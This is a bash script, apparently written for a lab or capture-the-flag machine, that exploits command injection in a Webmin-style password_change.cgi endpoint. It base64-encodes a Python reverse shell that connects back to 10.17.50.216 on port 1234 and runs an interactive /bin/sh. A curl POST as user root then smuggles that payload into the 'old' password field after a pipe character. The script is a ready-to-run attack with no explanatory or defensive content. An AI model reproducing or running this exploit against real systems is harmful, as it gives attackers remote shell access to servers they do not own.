#!/bin/bash

python_script_encoded="cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjE3LjUwLjIxNiIsMTIzNCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7Jwo="

curl -X POST \
     -H "Cookie: redirect=1; testing=1; sid=x; sessiontest=1" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "Referer: https://10.10.241.167:10000/session_login.cgi" \
     --data "user=root&pam=&expired=2&old=AkkuS%7c$python_script_encoded%20&new1=akkuss&new2=akkuss" \
     -k https://10.10.241.167:10000/password_change.cgi
